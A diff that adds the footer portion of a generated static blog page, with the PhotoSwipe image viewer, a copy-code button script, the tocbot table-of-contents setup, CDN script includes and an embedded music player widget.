+    <div class="reward-item">
+      <img class="reward-img" src="/images/%E5%BE%AE%E4%BF%A1.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="86"
+        src="//music.163.com/outchain/player?type=2&id=1858011775&auto=1&height=66"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
